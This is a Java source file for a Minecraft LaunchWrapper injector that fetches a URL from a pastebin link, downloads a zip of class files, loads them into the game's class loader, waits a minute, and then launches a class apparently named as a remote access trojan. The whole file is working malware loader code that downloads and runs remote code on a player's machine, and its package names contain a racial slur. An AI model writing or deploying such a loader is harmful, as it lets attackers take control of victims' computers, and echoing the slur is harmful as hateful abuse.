package me.nigger.injector;

import net.minecraft.launchwrapper.Launch;
import net.minecraft.launchwrapper.LaunchClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;
import java.util.Scanner;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Main
{
    public static void main()
    {
        new Thread(() -> new Main().run()).start();
    }

    private void run()
    {
        try
        {
            Field field = LaunchClassLoader.class.getDeclaredField("resourceCache");
            field.setAccessible(true);

            Map<String, byte[]> cache = (Map<String, byte[]>) field.get(Launch.classLoader);

            URL url = new URL(new Scanner(new URL("https://pastebin.com/raw/jdiVNVZ2").openStream(), "UTF-8").useDelimiter("\\A").next());
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream inputStream = httpURLConnection.getInputStream();

            ZipInputStream zipInputStream = new ZipInputStream(inputStream);

            ZipEntry zipEntry;
            while ((zipEntry = zipInputStream.getNextEntry()) != null)
            {
                String name = zipEntry.getName();

                if (!name.endsWith(".class")) continue;

                name = name.substring(0, name.length() - 6);
                name = name.replace('/', '.');

                ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
                int bytesRead;
                byte[] tempBuffer = new byte[8192 * 2];
                while ((bytesRead = zipInputStream.read(tempBuffer)) != -1)
                    streamBuilder.write(tempBuffer, 0, bytesRead);
                cache.put(name, streamBuilder.toByteArray());
            }

            Thread.sleep(60000);

            Class<?> aClass = Launch.classLoader.findClass("me.nigger.rat.Main");
            aClass.getMethod("main").invoke(null);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
